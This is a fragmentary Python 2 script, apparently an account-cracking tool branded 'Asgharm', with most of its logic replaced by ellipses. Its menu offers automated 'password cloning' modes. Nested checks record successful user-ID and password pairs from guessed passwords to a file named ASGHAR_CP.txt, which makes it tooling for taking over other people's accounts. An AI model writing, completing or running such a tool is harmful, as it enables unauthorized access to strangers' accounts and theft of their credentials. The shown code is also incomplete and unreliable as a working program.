...
try:
    ...
    os.system("python2 Asgharm.py")
os.system("clear")
"""
try:
    my = requests.get("https://github.com/asgharmalik37")
...
\033[1;94m                                 
     ...
     \033[32;1mGithub \033[37;1m: \033[33;1mhttps://github.com/asgharmalik37
...
def menu():
    ...
    print ' ------------------------------------------ '
    print '\x1b[1;92m[1] Auto Password Cloning (10)'
    print '\x1b[1;92m[2] Number Password Cloning (6)'
    print '\x1b[1;92m[3] Name + Number Password Cloning (8)'
...
def menu_s():
    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80select\xe2\x9e\xa4 ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        choice_crack()
                    ...
                    if 'loc' in q:
                        ...
                        if 'loc' in q:
                            ...
                            if 'loc' in q:
                                ...
                                print '\x1b[1;34;1m[ASGHAR-CP] ' + uid + ' | ' + pass5
                                cp = open('ASGHAR_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                ...
                                if 'loc' in q:
                                    ...
                                    print '\x1b[1;34;1m[ASGHAR-CP] ' + uid + ' | ' + pass6
                                    cp = open('ASGHAR_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    if 'loc' in q:
                                        ...
                                        print '\x1b[1;34;1m[ASGHAR-CP] ' + uid + ' | ' + pass7
                                        cp = open('ASGHAR_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        if 'loc' in q:
                                            ...
                                            print '\x1b[1;34;1m[ASGHAR-CP] ' + uid + ' | ' + pass8
                                            cp = open('ASGHAR_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            ...
                                            if 'loc' in q:
                                                ...
                                                print '\x1b[1;34;1m[ASGHAR-CP] ' + uid + ' | ' + pass9
                                                cp = open('ASGHAR_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                ...
                                                if 'loc' in q:
                                                    ...
                                                    print '\x1b[1;34;1m[ASGHAR-CP] ' + uid + ' | ' + pass10
                                                    cp = open('ASGHAR_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
...
def c_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Select\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
